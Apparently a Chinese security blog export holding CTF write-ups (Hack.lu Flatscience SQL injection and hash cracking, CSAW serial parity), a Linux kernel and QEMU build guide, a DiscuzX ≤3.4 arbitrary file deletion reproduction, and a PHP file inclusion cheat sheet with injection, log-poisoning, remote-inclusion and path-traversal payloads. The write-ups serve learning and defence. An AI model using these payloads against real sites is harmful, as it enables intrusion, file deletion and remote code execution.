最后比赛攻击是用的就是这个洞，应该还有其他漏洞，后面再进一步补上吧。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hack.lu CTF 2017-Flatscience-writeup]]></title>
      <url>%2F2017%2F10%2F22%2FHack-lu-CTF-2017-Flatscience-writeup%2F</url>
      <content type="text"><![CDATA[SQLite injectionburte force Task12The Professor on Flat Earth is Prof. Flux Horst. Only for bragging he made his own Blog showcasing his favorite Papers. Beeing the only Professor, he thinks he is the smartest Person arround the Plate. Can you proof him wrong and log into his Admin-Panel?Link https://flatscience.flatearth.fluxfingers.net/ Solution基本功能就是，提供了一堆的paper下载。。一共有30个pdf。整个站的基本结构如下： 访问 https://flatscience.flatearth.fluxfingers.net/robots.txt 得到：123User-agent: *Disallow: /login.phpDisallow: /admin.php 存在一个登陆页面： https://flatscience.flatearth.fluxfingers.net/login.php view-source下： 访问 https://flatscience.flatearth.fluxfingers.net/login.php?debug ，得到源代码：1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo "&lt;br&gt;Some Error occourred!"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header("Location: /"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; 通过POST接收usr和pw参数。没有做任何过滤，带入sql查询。若查询的结果id字段不为空，则执行setcookie操作，会将查询的结果name字段插入到cookie中。 考虑如下数据包：1234https://flatscience.flatearth.fluxfingers.net/login.phpPOST:usr=%27 UNION SELECT name, sql from sqlite_master--+&amp;pw=chybeta 注意sqlite的注释符是--，带入查询后，sql注入的结果是：1SELECT id,name from Users where name=&apos; &apos; UNION SELECT name, sql from sqlite_master-- and password= &apos;chybeta&apos; 从and起后面部分被注释掉。利用union联合查询sqlite系统表（ sqlite_master），得到的id值其实是表的名字（name），而得到的name值其实是创建表时的语句（sql）。 即：123456CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) 结合上面的这条语句，以及下面几条注入语句：1234usr=%27 UNION SELECT id, id from Users limit 0,1--+&amp;pw=chybeta usr=%27 UNION SELECT id, name from Users limit 0,1--+&amp;pw=chybetausr=%27 UNION SELECT id, password from Users limit 0,1--+&amp;pw=chybetausr=%27 UNION SELECT id, hint from Users limit 0,1--+&amp;pw=chybeta 通过偏移，可以得到表中数据。 name password hint admin 3fab54a50e770d830c0416df817567662a9dc85c my fav word in my fav paper?! fritze 54eae8935c90f467427f05e4ece82cf569f89507 my love is…? hansi 34b0bb7c304949f9ff2fc101eef0f048be10d3bd the password is password 直接去查没查出来。结合源码：1$res = $db-&gt;query(&quot;SELECT id,name from Users where name=&apos;&quot;.$user.&quot;&apos; and password=&apos;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&apos;&quot;); 而hint：1my fav word in my fav paper?! 所以将网站上所有的pdf文件下载下来（30个吧）。利用paper中的词尝试进行爆破。最后脚本如下：1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlibdef get_pdf(): return [i for i in os.listdir("./") if i.endswith("pdf")]def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return textdef find_password(): pdf_path = get_pdf() for i in pdf_path: print "Searching word in " + i pdf_text = convert_pdf_2_text(i).split(" ") for word in pdf_text: sha1_password = hashlib.sha1(word+"Salz!").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print "Find the password :" + word exit()if __name__ == "__main__": find_password() 得到密码为：ThinJerboa 访问 https://flatscience.flatearth.fluxfingers.net/admin.php 登陆得到flag： 1flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux kernel development (1): 环境准备]]></title>
      <url>%2F2017%2F10%2F19%2FLinux-kernel-development-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%2F</url>
      <content type="text"><![CDATA[linux kernel + busybox + qemuLinux kernel development (1): 环境准备 寻坑之旅linux kernel打包上路获取linux kernel源代码。因为书中根据的源代码是2.6，所以就只选择了这个版本。可以从 这里获取 https://www.kernel.org/pub/linux/kernel/v2.6/ 比如：1chybeta@ubuntu:~$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.39.tar.bz2 解压，会详细的列出解压的文件，解压后的文件会保存在linux-2.6.39文件夹中：1chybeta@ubuntu:~$ tar xvjf linux-2.6.32.tar.bz2 或者使用git，（这个会下载很大的文件）1chybeta@ubuntu:~$ git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux-2.6.git 然后根据需要的版本checkout出来。 进入解压出来的文件夹。接下去配置（config）内核。根据网上的方法，对于ubuntu系统，可以直接把/boot/ 里的.config文件拷贝到linux-2.6.32中。这里用用make menuconfig 来进行图形化配置内核并生成 .confgi文件：1chybeta@ubuntu:~/linux-2.6.39$ make menuconfig 不想进行个性化配置的话，可以使用默认生成的.config，我这里直接使用默认配置了:1chybeta@ubuntu:~/linux-2.6.39$ make defconfig 其他一些类似命令，这里仅列出： make oldconfig 使用已经存在的 ./.config的内容，将里面的原本值作为新config的设定值。新config中涉及的新特性则列出来让用户选择。 make gconfig 用Gtx图形界面来配置。需要X window支持。 make xconfig 用Qt图形界面来配置。需要X window支持。 make config 配置完（我直接保持默认配置没进行改动）后，选择 Save an Alternate Configuration File，将配置保存到 .config 文件中。 接下里开始make12chybeta@ubuntu:~/linux-2.6.39$ make allchybeta@ubuntu:~/linux-2.6.39$ make module 在make all中可能会遇到各种坑，遇到的话看这把。ps，好像make module可以不用。 最后编译完成： 生成的镜像存放在 arch/x86/boot/bzImage。12chybeta@ubuntu:~/linux-2.6.39$ file arch/x86/boot/bzImagearch/x86/boot/bzImage: Linux kernel x86 boot executable bzImage, version 2.6.39 (chybeta@ubuntu) #1 SMP Sat Oct 21 00:50:51 CST 2017, RO-rootFS, root_dev 0x801, swap_dev 0x3, Normal VGA 正式填坑这次是第一次，但绝不会是最后一次编译内核。所以这部份会长期保持更新。希望对各位有用。 有可能在make all的时候出现下面这些错误： 坑一1fatal error: linux/compiler-gcc5.h: No such file or directory 原因是 不支持gcc-5编译。可以到这里去下一份对应的compiler-gcc5.h。放到 include/linux/compiler-gcc5.h 坑二12Can&apos;t use &apos;defined(@array)&apos; (Maybe you should just omit the defined()?) at kernel/timeconst.pl line 373./home/chybeta/linux-2.6.39/kernel/Makefile:141: recipe for target &apos;kernel/timeconst.h&apos; failed 编辑 kernel/timeconst.pl ，第372行左右：12345@val = @&#123;$canned_values&#123;$hz&#125;&#125;;if (!defined(@val)) &#123; @val = compute_values($hz);&#125;output($hz, @val); 修改为：12345@val = @&#123;$canned_values&#123;$hz&#125;&#125;;if (!@val) &#123; @val = compute_values($hz);&#125;output($hz, @val); 坑三 12345678910drivers/gpu/drm/i915/i915_drv.o:i915_drv.c:(.text+0x406): first defined herescripts/Makefile.build:405: recipe for target &apos;drivers/gpu/drm/i915/i915.o&apos; failedmake[4]: *** [drivers/gpu/drm/i915/i915.o] Error 1scripts/Makefile.build:419: recipe for target &apos;drivers/gpu/drm/i915&apos; failedmake[3]: *** [drivers/gpu/drm/i915] Error 2scripts/Makefile.build:419: recipe for target &apos;drivers/gpu/drm&apos; failedmake[2]: *** [drivers/gpu/drm] Error 2scripts/Makefile.build:419: recipe for target &apos;drivers/gpu&apos; failedmake[1]: *** [drivers/gpu] Error 2Makefile:919: recipe for target &apos;drivers&apos; failed google/stackoverflow上没找到解决方案。 我直接修改了由make defconfig生成的.config文件，其中第1781左右，是关于图形化（Graphics support）的部分，修改参数为如下：1234567891011121314151617181920## Graphics support## CONFIG_AGP is not setCONFIG_VGA_ARB=yCONFIG_VGA_ARB_MAX_GPUS=1# CONFIG_VGA_SWITCHEROO is not set# CONFIG_DRM is not set# CONFIG_STUB_POULSBO is not set# CONFIG_VGASTATE is not set# CONFIG_VIDEO_OUTPUT_CONTROL is not set# CONFIG_FB is not setCONFIG_BACKLIGHT_LCD_SUPPORT=y# CONFIG_LCD_CLASS_DEVICE is not setCONFIG_BACKLIGHT_CLASS_DEVICE=yCONFIG_BACKLIGHT_GENERIC=y# CONFIG_BACKLIGHT_PROGEAR is not set# CONFIG_BACKLIGHT_APPLE is not set# CONFIG_BACKLIGHT_SAHARA is not set# CONFIG_BACKLIGHT_ADP8860 is not set busyboxbusybox里面集成了多种常用linux命令。接下去需要用busybox来生成linux的根文件系统。 在 https://busybox.net/ 处下载源码，我下的版本是 BusyBox 1.27.2。 解压缩：1chybeta@ubuntu:~$ tar -xvjf busybox-1.27.2.tar.bz2 进入busybox文件夹，需要使用静态链接的方式来编译：1chybeta@ubuntu:~/busybox-1.27.2$ make menuconfig 先进入 Busybox Setting，之后选择Build Options中的 Build Busybox as a static library。 1chybeta@ubuntu:~/busybox-1.27.2$ make install 安装成功。 install后，默认会在busybox的目录下生成一个 _install目录。接下来用这个目录来生成虚拟机挂载时需要的根文件目录。 这一步，创建一个目录用于保存rootfs.img1chybeta@ubuntu:~/busybox-1.27.2$ mkdir ../kernelrootfs 生成:123chybeta@ubuntu:~/busybox-1.27.2$ cd _install/chybeta@ubuntu:~/busybox-1.27.2/_install$ find . | cpio -o --format=newc &gt; ../../kernelrootfs/rootfs.img5213 blocks 结果：12chybeta@ubuntu:~/kernelrootfs$ file rootfs.imgrootfs.img: ASCII cpio archive (SVR4 with no CRC) Qemuqemu是一个开源的虚拟机，它内部实现了一个gdb server，能方便和gdb对内核进行联合调试。安装qemu虚拟机：1chybeta@ubuntu:~$ sudo apt-get install qemu qemu-system 用qemu开启虚拟机：1chybeta@ubuntu:~$ qemu-system-x86_64 -kernel linux-2.6.39/arch/x86/boot/bzImage -initrd kernelrootfs/rootfs.img -append &quot;root=/dev/ram rdinit=/bin/sh&quot; 参数-kernel，用于指定内核的所在地，在前面部分已经保存在为 linux-2.6.39/arch/x86/boot/bzImage 。参数-initrd用于指定linux系统挂载用的根文件目录，由前面章节，已经保存在为 kernelrootfs/rootfs.img 。这两个参数，根据你前面的配置而定。 后记还有一些其他的操作还没写出来，比如添加系统调用（syscall）之类的。以后用到再慢慢补充吧。 Refference Compiling Linux kernel and running it using QEMU Linux 内核漏洞利用教程（一）：环境配置 linux: running self compiled kernel in qemu: VFS: Unable to mount root fs on unknown wn-block(0,0) 如何使用busybox编译和生成最简linux根文件系统（rootfs）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[DiscuzX v3.4 任意文件删除漏洞]]></title>
      <url>%2F2017%2F10%2F15%2FDiscuzX-v3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[代码审计学习。玩一玩老洞应该没关系吧。。 漏洞影响DiscuzX版本 ≤ v3.4 官方于9月29日修复该漏洞： https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574 漏洞复现Dz下载地址： https://gitee.com/ComsenzDiscuz/DiscuzX.git 选择一个时间线在9月29日前的进行git checkout即可。比如 git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be。安装完成后，在当前目录下准备一个待删除的文件，比如theTestFile.txt 随便注册一个号，进入个人设置中心，即：1http://10.10.10.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base cmsPoc登陆后获取cookie后，命令行：1python cmspoc.py -u http://10.10.10.1:2500/DiscuzX/upload/home.php -t discuzx -s v34_delete_arbitrary_files 粘贴cookie，后输入需要删除的文件。 手动修改出生地址为要删除的文件地址，这里比如 ../../theTestFile.txt 可以用burp截包修改 也可以先查看源代码（ctrl+U）后找到formhash值，这里测试环境中为2c7400c6 然后直接进行POST:1234http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profilePOST:birthprovince=../../../theTestFile.txt&amp;profilesubmit=1&amp;formhash=2c7400c6 回到个人资料处，可以发现出生地已经改变。 法一接下去是进行正式的任意文件删除。可以自己构造一个表单，如下：123456&lt;form action="http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base" method="POST" enctype="multipart/form-data"&gt;&lt;input type="file" name="birthprovince" value="../../../theTestFile.txt"/&gt;&lt;input type="hidden" name="formhash" value="2c7400c6"/&gt;&lt;input type="hidden" name="profilesubmit" value="1"/&gt;&lt;input type="submit" value="Submit"/&gt;&lt;/from&gt; 这里要注意两个点： 需要post一个birthprovince参数，其值为要删除的文件，即../../../theTestFile.txt 需要指定formhash参数，这里的值为2c7400c6 选择随便一张图片上传，点击submit，可以发现原本的theTestFile.txt已经被删除。 法二另一种删除方法，直接在个人资料页面修改html代码。比如修改真实姓名处 修改name，value，type分别为birthprovince，要删除的文件路径，file。 之后选择随便一张图片上传，点击下方的保存，同样theTestFile也被删除。 漏洞分析在source/include/spacecp/spacecp_profile.php中，第69行：1if(submitcheck('profilesubmit')) &#123; 先对profilesubmit进行了一次检查。 之后第188行，有一段处理上传文件的代码：123if($_FILES) &#123; $upload = new discuz_upload(); foreach($_FILES as $key =&gt; $file) 往下看，约莫第208行左右，有下述代码：123456789101112131415161718192021222324if(!$upload-&gt;error()) &#123; $upload-&gt;save(); if(!$upload-&gt;get_image_info($attach['target'])) &#123; @unlink($attach['target']); continue; &#125; $setarr[$key] = ''; $attach['attachment'] = dhtmlspecialchars(trim($attach['attachment'])); if($vid &amp;&amp; $verifyconfig['available'] &amp;&amp; isset($verifyconfig['field'][$key])) &#123; if(isset($verifyinfo['field'][$key])) &#123; @unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]); $verifyarr[$key] = $attach['attachment']; &#125; continue; &#125; if(isset($setarr[$key]) &amp;&amp; $_G['cache']['profilesetting'][$key]['needverify']) &#123; @unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]); $verifyarr[$key] = $attach['attachment']; continue; &#125; @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]); $setarr[$key] = $attach['attachment'];&#125; 当文件上传成功，也就是!$upload-&gt;error()，会执行到unlink语句：1@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); 这里的$key，在前面foreach($_FILES as $key =&gt; $file)中定义。 而$space，为用户个人资料，在source/include/spacecp/spacecp_profile.php的第23行左右：123$space = getuserbyuid($_G['uid']);space_merge($space, 'field_home');space_merge($space, 'profile'); 这些操作会将用户相关的信息通过数据库提取出来保存到变量$space中。你可以在上面三句代码后面加上一句var_dump($space);，然后访问 http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile 。 即可看到一堆的变量，比如说birthprovince。 所以思考一下这个过程： 设置birthprovince为要删除的文件，比如../../theTestFile.txt 上传文件，构造$key 为 birthprovince。 $space[$key] = $space[birthprovince] = 拼接后 unlink(getglobal(XXX/profile/../../theTestFile.txt) 达到任意文件删除。 上面的这个思路，即对应着前面漏洞复现中的法一和法二。 相关老洞乌云编号： wooyun-2014-065513 当时的漏洞代码出在source/include/spacecp/spacecp_profile.php中，第69行：1234567891011# 这是当时的漏洞代码if($_GET[&apos;deletefile&apos;] &amp;&amp; is_array($_GET[&apos;deletefile&apos;])) &#123; foreach($_GET[&apos;deletefile&apos;] as $key =&gt; $value) &#123; if(isset($_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key])) &#123; echo (getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); @unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$verifyinfo[&apos;field&apos;][$key]); $verifyarr[$key] = $setarr[$key] = &apos;&apos;; &#125; &#125;&#125; 官方当时的补丁做法是：增加了一次判断1234567891011if($_GET['deletefile'] &amp;&amp; is_array($_GET['deletefile'])) &#123; foreach($_GET['deletefile'] as $key =&gt; $value) &#123; if(isset($_G['cache']['profilesetting'][$key]) &amp;&amp; $_G['cache']['profilesetting'][$key]['formtype'] == 'file') &#123; echo "0"; @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]); @unlink(getglobal('settin g/attachdir').'./profile/'.$verifyinfo['field'][$key]); $verifyarr[$key] = $setarr[$key] = ''; &#125; &#125;&#125; 在删除之间多进行了一次验证：$_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;formtype&#39;] == &#39;file&#39;，也就是说，若要成功删除， 需要formtype为file类型。 漏洞修复这次的漏洞修复简单粗暴，将unlink语句直接删除。。 Refference LoRexxar:Discuz!X ≤3.4 任意文件删除漏洞分析 0r3ak：Discuz!X 前台任意文件删除漏洞深入解析]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[php文件包含漏洞]]></title>
      <url>%2F2017%2F10%2F08%2Fphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[php文件包含漏洞学习合上吧，没有新姿势。 基本相关函数php中引发文件包含漏洞的通常是以下四个函数： include() include_once() require() require_once() reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。 include() 如果出错的话，只会提出警告，会继续执行后续语句。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：1234&lt;?php $file = $_GET['file']; include $file;?&gt; 在同目录下有个phpinfo.txt，其内容为&lt;? phpinfo(); ?&gt;。则只需要访问：1index.php?file=phpinfo.txt 即可成功解析phpinfo。 场景 具有相关的文件包含函数。 文件包含函数中存在动态变量，比如 include $file;。 攻击者能够控制该变量，比如$file = $_GET[&#39;file&#39;];。 分类LFI(Local File Inclusion)本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻，需要php.ini中进行配置 allow_url_fopen = On allow_url_include = On 两个配置选项均需要为On，才能远程包含文件成功。 在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 包含姿势下面例子中测试代码均为：1234&lt;?php $file = $_GET['file']; include $file;?&gt; allow_url_fopen 默认为 Onallow_url_include 默认为 Off 若有特殊要求，会在利用条件里指出。 php伪协议php://input利用条件： allow_url_include = On。 对allow_url_fopen不做要求。 姿势：12345index.php?file=php://inputPOST:&lt;? phpinfo();?&gt; php://filter利用条件：无甚 姿势：1index.php?file=php://filter/read=convert.base64-encode/resource=index.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode("PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg==")b"&lt;?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?&gt;" 其他姿势：1index.php?file=php://filter/convert.base64-encode/resource=index.php 效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。 phar://利用条件： php版本大于等于php5.3.0 姿势： 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下： 指定绝对路径1index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt 或者使用相对路径（这里test.zip就在当前目录下）1index.php?file=phar://test.zip/phpinfo.txt zip://利用条件： php版本大于等于php5.3.0 姿势：构造zip包的方法同phar。 但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。1index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt 若是使用相对路径，则会包含失败。 data:URI schema利用条件： php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On 姿势一：1index.php?file=data:text/plain,&lt;?php phpinfo();?&gt; 执行命令：1index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt; 姿势二：1index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; 执行命令：1index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 其中PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：&lt;?php system(&#39;whoami&#39;);?&gt; 包含session利用条件：session文件路径已知，且其中内容部分可控。 姿势： php的session文件的保存路径可以在phpinfo的session.save_path看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 比如这篇文章：透過 LFI 引入 PHP session 檔案觸發 RCE 包含日志访问日志利用条件： 需要知道服务器日志的存储路径，且日志文件可读。 姿势： 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。 正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 这里提供一道包含日志的CTF题目：SHACTF-2017- Bon Appétit (100)-writeup SSH log利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log 姿势： 用ssh连接：1ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后会提示输入密码等等，随便输入。 然后在remotehost的ssh-log中即可写入php代码： 之后进行文件包含即可。 参考：RCE with LFI and SSH Log Poisoning 包含environ利用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 姿势： proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 可以参考这个： The proc/self/environ Injection shell via LFI - proc/self/environ method 包含fd跟包含environ类似。 参考： LFI Cheat Sheet：/proc/self/environ LFI Method 包含临时文件 php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考LFI With PHPInfo Assistance 类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：XMAN夏令营-2017-babyweb-writeup 包含上传文件利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。 姿势： 往往要配合上传的姿势，不说了，太多了。 其余一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。 绕过姿势接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的include $_GET[&#39;file&#39;];这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：1234&lt;?php $file = $_GET['file']; include '/var/www/html/'.$file.'/test/test.php';?&gt; 这样就很“难”直接去包含前面提到的种种文件。 指定前缀先考虑一下指定了前缀的情况吧。测试代码:1234&lt;?php $file = $_GET['file']; include '/var/www/html/'.$file;?&gt; 目录遍历这个最简单了，简要的提一下。 现在在/var/log/test.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历，比如我们尝试访问：1include.php?file=../../log/test.txt 则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。 编码绕过服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。 利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\ %2e%2e%5c ..%5c %2e%2e\ 二次编码 ../ %252e%252e%252f ..\ %252e%252e%255c 容器/服务器的编码方式 ../ ..%c0%af 注：Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/ 注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\ ..%c1%9c 指定后缀接着考虑指定后缀的情况。测试代码:1234&lt;?php $file = $_GET['file']; include $file.'/test/test.php';?&gt; URLurl格式1protocol :// hostname[:port] / path / [;parameters][?query]#fragment 在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。 姿势一：query（？）1index.php?file=http://remoteaddr/remoteinfo.txt? 则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。 姿势二：fragment（#）1index.php?file=http://remoteaddr/remoteinfo.txt%23 则包含的文件为 http://remoteaddr/remoteinfo.txt#/test/test.php问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。 利用协议前面有提到过利用zip协议和phar协议。假设现在测试代码为：1234&lt;?php $file = $_GET['file']; include $file.'/test/test.php';?&gt; 构造压缩包如下： 其中test.php内容为：1&lt;?php phpinfo(); ?&gt; 利用zip协议，注意要指定绝对路径1index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta 则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php 能成功包含。 在利用phar协议的时候有些问题。哪位能指教一下？ 长度截断利用条件： php版本 &lt; php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./1index.php?file=././././。。。省略。。。././shell.txt 则后缀/test/test.php，在达到最大值后会被直接丢弃掉。 0字节截断利用条件： php版本 &lt; php 5.3.4 1index.php?file=phpinfo.txt%00 能利用00截断的场景现在应该很少了：） 防御方案 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败 做好文件的权限管理 对危险字符进行过滤等等 Refference 《白帽子讲Web安全》 From LFI to RCE in php l3m0n: 文件包含漏洞小结 LFI Cheat Sheet Local File Inclusion]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSAW CTF 2017-MISC-writeup]]></title>
      <url>%2F2017%2F10%2F07%2FCSAW-CTF-2017-MISC-writeup%2F</url>
      <content type="text"><![CDATA[待续。 MiscSerial1nc misc.chal.csaw.io 4239 考察数据奇偶校验。nc连上后，如下：12345root@chybeta:~/Desktop/test# nc misc.chal.csaw.io 42398-1-1 even parity. Respond with &apos;1&apos; if you got the byte, &apos;0&apos; to retransmit.001100100010 # ps: 这是我发送的00100011001 初次连上后，会给出一个字符串 00110010001，根据偶校验，选择发送是0还是1，然后服务器端会再返回下一个字符串。 从给出的提示信息，以及结合串口通信标准来看，每次我们收到的字符串总共是11位，其中第一位都是0，表示数据的开始，剩下的数据满足8-1-1，是指有8位数据位，1位校检位，以及1位的停止位。 比如说：00110010001 起始位 数据位 奇偶校验位 停止位 0 01100100 0 1 这里数据位中1的个数是3，为奇数，奇偶校验位本应该为1，但接受的数据的奇偶校验位为0，说明发生了错误。根据题目的信息：1Respond with &apos;1&apos; if you got the byte, &apos;0&apos; to retransmit. 我们要返回一个 0。 最后的脚本如下：123456789101112131415161718192021222324252627from pwn import *r = remote("misc.chal.csaw.io",4239)r.recvuntil("Respond with '1' if you got the byte, '0' to retransmit.\n")flag = ""while True: try: s = r.recv() data = s[1:9] even = s[9] end = s[10] num = 0 for i in data: if i == '1': num = num + 1 if (num % 2 == 0 and even == "0") or (num % 2 != 0 and even == "1") : r.sendline("1") flag += chr(int(data,2)) # print(chr(int(data,2))) log.info(flag) else: r.sendline("0") except: breaklog.success("The flag : " + flag) 最后得到的flag：1flag&#123;@n_int3rface_betw33n_data_term1nal_3quipment_and_d@t@_circuit-term1nating_3quipment&#125; CVV12Hey fam, you got CVV? I need some CVV!nc misc.chal.csaw.io 8308 Twitch Plays Pwnable123How long does it take several thousand hackers to exploit a buffer overflow?https://twitch.tv/csawtvUPDATE 8:03 Eastern: Apparently the answer is ~10 hours to not exploit the overflow. ForensicsMissed Registration1234It&apos;s registration day! These forms just seem longer and longer...UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.UPDATE 2:58 Eastern: We&apos;re regenerating due to flag leaks, submissions disabled until then. Please be patient.Update 3:31 Eastern: Updated pcap with new 